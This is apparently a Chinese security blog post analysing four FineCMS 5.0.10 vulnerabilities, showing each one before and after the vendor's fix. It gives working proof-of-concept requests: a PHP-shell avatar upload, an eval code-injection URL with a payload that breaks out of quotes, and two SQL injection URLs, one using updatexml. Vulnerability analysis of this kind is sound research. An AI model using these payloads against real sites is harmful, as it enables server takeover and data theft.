# 0x01 前言

  
今天的这个CMS是FineCMS，版本是5.0.10版本的几个漏洞分析，从修补漏洞前和修补后的两方面去分析。

> 文中的evai是特意写的，因为会触发论坛的防护机制，还有分页那一段的代码也去掉了，因为会触发论坛分页的bug。

# 0x02 环境搭建

<https://www.ichunqiu.com/vm/59011/1> 可以去i春秋的实验，不用自己搭建那么麻烦了。

# 0x03 任意文件上传漏洞

## 1.漏洞复现

用十六进制编辑器写一个有一句话的图片

去网站注册一个账号，然后到上传头像的地方。

抓包，把jepg的改成php发包。

![image.png](https://image.3001.net/images/20181120/1542699740_5bf3badc98152.png!small)  

可以看到文件已经上传到到`/uploadfile/member/用户ID/0x0.php`  

`![image.png](https://image.3001.net/images/20181120/1542699761_5bf3baf10db09.png!small)  
`

  

2.漏洞分析  

文件：`finecms/dayrui/controllers/member/Account.php` 177~244行

    
    
    /**
     *  上传头像处理
     *  传入头像压缩包，解压到指定文件夹后删除非图片文件
     */
    public function upload() {
    
        // 创建图片存储文件夹
        $dir = SYS_UPLOAD_PATH.'/member/'.$this->uid.'/';
        @dr_dir_delete($dir);
        !is_dir($dir) && dr_mkdirs($dir);
    
        if ($_POST['tx']) {
            $file = str_replace(' ', '+', $_POST['tx']);
            if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $file, $result)){
                $new_file = $dir.'0x0.'.$result[2];
                if (!@file_put_contents($new_file, base64_decode(str_replace($result[1], '', $file)))) {
                    exit(dr_json(0, '目录权限不足或磁盘已满'));
                } else {
                    $this->load->library('image_lib');
                    $config['create_thumb'] = TRUE;
                    $config['thumb_marker'] = '';
                    $config['maintain_ratio'] = FALSE;
                    $config['source_image'] = $new_file;
                    foreach (array(30, 45, 90, 180) as $a) {
                        $config['width'] = $config['height'] = $a;
                        $config['new_image'] = $dir.$a.'x'.$a.'.'.$result[2];
                        $this->image_lib->initialize($config);
                        if (!$this->image_lib->resize()) {
                            exit(dr_json(0, '上传错误：'.$this->image_lib->display_errors()));
                            break;
                        }
                    }
                    list($width, $height, $type, $attr) = getimagesize($dir.'45x45.'.$result[2]);
                    !$type && exit(dr_json(0, '图片字符串不规范'));
                }
            } else {
    
                exit(dr_json(0, '图片字符串不规范'));
            }
        } else {
            exit(dr_json(0, '图片不存在'));
        }
    
    // 上传图片到服务器
        if (defined('UCSSO_API')) {
            $rt = ucsso_avatar($this->uid, file_get_contents($dir.'90x90.jpg'));
            !$rt['code'] && $this->_json(0, fc_lang('通信失败：%s', $rt['msg']));
        }
    
        exit('1');
    }

这个我记得在5.0.8的版本有讲过这个代码的漏洞执行https://getpass.cn/2018/01/30/The%20latest%20version%20of%20FineCMS%205.0.8%20getshell%20daily%20two%20holes/

后来官方修复的方案是加上了白名单了：

    
    
                    if (!in_array(strtolower($result[2]), array('jpg', 'jpeg', 'png', 'gif'))) {
                        exit(dr_json(0, '目录权限不足'));
                    }
                    ...
                     $c = 0;
                        if ($fp = @opendir($dir)) {
                            while (FALSE !== ($file = readdir($fp))) {
                                $ext = substr(strrchr($file, '.'), 1);
                                if (in_array(strtolower($ext), array('jpg', 'jpeg', 'png', 'gif'))) {
                                    if (copy($dir.$file, $my.$file)) {
                                        $c++;
                                    }
                                }
                            }
                            closedir($fp);
                        }
                        if (!$c) {
                            exit(dr_json(0,  fc_lang('未找到目录中的图片')));
                        }
    

# 0x04 任意代码执行漏洞

## 1.漏洞复现

`auth`下面的分析的时候会说到怎么获取

浏览器输入：  
`http://getpass1.cn/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df¶m=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271`

![image.png](https://image.3001.net/images/20181120/1542699818_5bf3bb2ad70d1.png!small)  

## 2.漏洞分析

这个漏洞的文件在`/finecms/dayrui/controllers/Api.php`的`data2()`

    
    
    public function data2() {
            $data = array();
    
            // 安全码认证
            $auth = $this->input->get('auth', true);
            if ($auth != md5(SYS_KEY)) {
                // 授权认证码不正确
                $data = array('msg' => '授权认证码不正确', 'code' => 0);
            } else {
                // 解析数据
                $cache = '';
                $param = $this->input->get('param');
                if (isset($param['cache']) && $param['cache']) {
                    $cache = md5(dr_array2string($param));
                    $data = $this->get_cache_data($cache);
                }
                if (!$data) {
    
                    // list数据查询
                    $data = $this->template->list_tag($param);
                    $data['code'] = $data['error'] ? 0 : 1;
                    unset($data['sql'], $data['pages']);
    
                    // 缓存数据
                    $cache && $this->set_cache_data($cache, $data, $param['cache']);
                }
            }
    
            // 接收参数
            $format = $this->input->get('format');
            $function = $this->input->get('function');
            if ($function) {
                if (!function_exists($function)) {
                    $data = array('msg' => fc_lang('自定义函数'.$function.'不存在'), 'code' => 0);
                } else {
                    $data = $function($data);
                }
            }
    
            // 页面输出
            if ($format == 'php') {
                print_r($data);
            } elseif ($format == 'jsonp') {
                // 自定义返回名称
                echo $this->input->get('callback', TRUE).'('.$this->callback_json($data).')';
            } else {
                // 自定义返回名称
                echo $this->callback_json($data);
            }
            exit;
    
            }

可以看到开头这里验证了认证码：

    
    
    // 安全码认证
        $auth = $this->input->get('auth', true);
        if ($auth != md5(SYS_KEY)) {
            // 授权认证码不正确
            $data = array('msg' => '授权认证码不正确', 'code' => 0);
        } else {

  
授权码在`/config/system.php`  

`![image.png](https://image.3001.net/images/20181120/1542699865_5bf3bb5975962.png!small)  
`

`可以看到`SYS_KEY`是固定的，我们可以在Cookies找到，`/finecms/dayrui/config/config.php`  
`

``![image.png](https://image.3001.net/images/20181120/1542699880_5bf3bb686b9c8.png!small)  
``

``用浏览器查看Cookies可以看到KEY，但是验证用MD5，我们先把KEY加密就行了。  
``

``![image.png](https://image.3001.net/images/20181120/1542699912_5bf3bb885a3a9.png!small)  
``

直接看到这一段，调用了`Template`对象里面的`list_tag`函数

    
    
    if (!$data) {
    
                    // list数据查询
                    $data = $this->template->list_tag($param);
                    $data['code'] = $data['error'] ? 0 : 1;
                    unset($data['sql'], $data['pages']);
    
                    // 缓存数据
                    $cache && $this->set_cache_data($cache, $data, $param['cache']);
                }

我们到`finecms/dayrui/libraries/Template.php`看`list_tag`函数的代码,代码有点长，我抓重点的地方,这里把`param=action=cache%20name=MEMBER.1%27];phpinfo();$a=[%271`的内容分为两个数组`$var`、`$val`，这两个数组的内容分别为

    
    
    $var=['action','name']
    $val=['cache%20','MEMBER.1%27];phpinfo();$a=[%271']

`$cache=_cache_var`是返回会员的信息  
重点的是下面的 `@evai('$data=$cache'.$this->_get_var($_param).';');`

    
    
    foreach ($params as $t) {
                $var = substr($t, 0, strpos($t, '='));
                $val = substr($t, strpos($t, '=') + 1);

再看这一段,因为`swtich`选中的是`cache`，所有就不再进行下面的分析了。  
`$pos = strpos($param['name'], '.');`这句是为下面的`substr`函数做准备。  
是为了分离出的内容为

    
    
    $_name='MEMBER'
    $_param="1%27];phpinfo();$a=[%271"
    
    
     // action
            switch ($system['action']) {
    
                case 'cache': // 系统缓存数据
                    if (!isset($param['name'])) {
                        return $this->_return($system['return'], 'name参数不存在');
                    }
    
                    $pos = strpos($param['name'], '.');
                    if ($pos !== FALSE) {
                        $_name = substr($param['name'], 0, $pos);
                        $_param = substr($param['name'], $pos + 1);
                    } else {
                        $_name = $param['name'];
                        $_param = NULL;
                    }
                    $cache = $this->_cache_var($_name, !$system['site'] ? SITE_ID : $system['site']);
                    if (!$cache) {
                        return $this->_return($system['return'], "缓存({$_name})不存在，请在后台更新缓存");
                    }
                    if ($_param) {
                        $data = array();
                        @evai('$data=$cache'.$this->_get_var($_param).';');
                        if (!$data) {
                            return $this->_return($system['return'], "缓存({$_name})参数不存在!!");
                        }
                    } else {
                        $data = $cache;
                    }
    
                    return $this->_return($system['return'], $data, '');
                    break;

跟踪`get_var`函数，在这里我们先把`$param`的内容假设为a,然后执行函数里面的内容，最后返回的`$string`的内容是：  
`$string=['a']`  
那么我们的思路就是把两边的[' ']闭合然后再放上恶意的代码。  
payload为：`1'];phpinfo();$a=['1`  
那么返回的`$string`的内容：  
`$string=['1'];phpinfo();$a=['1']`

    
    
    public function _get_var($param) {
            $array = explode('.', $param);
            if (!$array) {
                return '';
            }
            $string = '';
            foreach ($array as $var) {
                $string.= '[';
                if (strpos($var, '$') === 0) {
                    $string.= preg_replace('/\[(.+)\]/U', '[\'\\1\']', $var);
                } elseif (preg_match('/[A-Z_]+/', $var)) {
                    $string.= ''.$var.'';
                } else {
                    $string.= '\''.$var.'\'';
                }
                $string.= ']';
            }
    
            return $string;
        }

修复后的`_get_var`函数里面多了一个`dr_safe_replace`过滤函数，然后`data2()`删除了。

    
    
     public function _get_var($param) {
    
            $array = explode('.', $param);
            if (!$array) {
                return '';
            }
            $string = '';
            foreach ($array as $var) {
                $var = dr_safe_replace($var);
                $string.= '[';
                if (strpos($var, '$') === 0) {
                    $string.= preg_replace('/\[(.+)\]/U', '[\'\\1\']', $var);
                } elseif (preg_match('/[A-Z_]+/', $var)) {
                    $string.= ''.$var.'';
                } else {
                    $string.= '\''.$var.'\'';
                }
                $string.= ']';
            }
    
            return $string;
        }

`dr_safe_replace()`

    
    
    function dr_safe_replace($string) {
        $string = str_replace('%20', '', $string);
        $string = str_replace('%27', '', $string);
        $string = str_replace('%2527', '', $string);
        $string = str_replace('*', '', $string);
        $string = str_replace('"', '"', $string);
        $string = str_replace("'", '', $string);
        $string = str_replace('"', '', $string);
        $string = str_replace(';', '', $string);
        $string = str_replace('<', '<', $string);
        $string = str_replace('>', '>', $string);
        $string = str_replace("{", '', $string);
        $string = str_replace('}', '', $string);
        return $string;
    }
    

# 0x05 任意SQL语句执行1

## 1.漏洞复现

浏览器：

`http://getpass1.cn/index.php?c=api&m=data2&auth=582f27d140497a9d8f048ca085b111df¶m=action=sql%20sql=%27select%20version();%27`

  
![image.png](https://image.3001.net/images/20181120/1542700009_5bf3bbe98ff15.png!small)  

## 2.漏洞分析

这里就不用debug模式去跟进了，有不懂CI框架的数据库操作可以去看官方文档http://codeigniter.org.cn/user_guide/database/index.html

问题一样出在`finecms/dayrui/controllers/Api.php`中的`data2()`,可以直接去看`finecms/dayrui/libraries/Template.php`里面的`list_tag()`函数

fenye

这里想说一下就是`preg_match`这个函数的作用，他匹配过后sql是一个数组：

    
    
    array(2) {
      [0]=>
      string(23) "sql='select version();'"
      [1]=>
      string(17) "select version();"
    }

![image.png](https://image.3001.net/images/20181120/1542700230_5bf3bcc62a1fa.png!small)  

这里判断了开头的位置是否只使用了`select`

    
    
     if (stripos($sql, 'SELECT') !== 0) {
                            return $this->_return($system['return'], 'SQL语句只能是SELECT查询语句');

再往下看，这一句才是执行SQL的地方，传入sql内容和`$system['site']`默认是`1`,`$system['cache']`
默认缓存时间是`3600`

    
    
     $data = $this->_query($sql, $system['site'], $system['cache']);

继续跟进`_query()`函数

    
    
    public function _query($sql, $site, $cache, $all = TRUE) {
            echo $this->ci->site[$site];
            // 数据库对象
            $db = $site ? $this->ci->site[$site] : $this->ci->db;
            $cname = md5($sql.dr_now_url());
            // 缓存存在时读取缓存文件
            if ($cache && $data = $this->ci->get_cache_data($cname)) {
                return $data;
            }
    
            // 执行SQL
            $db->db_debug = FALSE;
            $query = $db->query($sql);
    
            if (!$query) {
                return 'SQL查询解析不正确：'.$sql;
            }
    
            // 查询结果
            $data = $all ? $query->result_array() : $query->row_array();
    
            // 开启缓存时，重新存储缓存数据
            $cache && $this->ci->set_cache_data($cname, $data, $cache);
    
            $db->db_debug = TRUE;
    
            return $data;
        }

没有对函数进行任何过滤`$query = $db->query($sql);`，直接带入了我们的语句。

官方的修复方法：删除了`data2()`函数

# 0x06 任意SQL语句执行2

## 1.漏洞复现

浏览器：

`http://getpass1.cn/index.php?s=member&c=api&m=checktitle&id=1&title=1&module=news,(select%20(updatexml(1,concat(1,(select%20user()),0x7e),1)))a`

  
![image.png](https://image.3001.net/images/20181120/1542700256_5bf3bce0c59d0.png!small)  

## 2\. 漏洞分析

文件在`finecms/dayrui/controllers/member/Api.php`的`checktitle()`函数

    
    
        public function checktitle() {
    
            $id = (int)$this->input->get('id');
            $title = $this->input->get('title', TRUE);
            $module = $this->input->get('module');
    
            (!$title || !$module) && exit('');
    
            $num = $this->db->where('id<>', $id)->where('title', $title)->count_all_results(SITE_ID.'_'.$module);
            echo $num;
            $num ? exit(fc_lang('<font color=red>'.fc_lang('重复').'</font>')) : exit('');
        }

其他的没什么过滤，主要是CI框架里面的一些内置方法，比如`count_all_results`，可以到http://codeigniter.org.cn/user_guide/database/query_builder.html?highlight=count_all_results#CI_DB_query_builder::count_all_results
查看用法

还有一个就是`SITE_ID`变量，它是指

  
![image.png](https://image.3001.net/images/20181120/1542700282_5bf3bcfa1cd25.png!small)  

> 站点是系统的核心部分，各个站点数据独立，可以设置站点分库管理

  
![image.png](https://image.3001.net/images/20181120/1542700291_5bf3bd03e25f6.png!small)  

剩下也没什么可分析了，不懂updatexml语句可以看下面的参考链接

#  

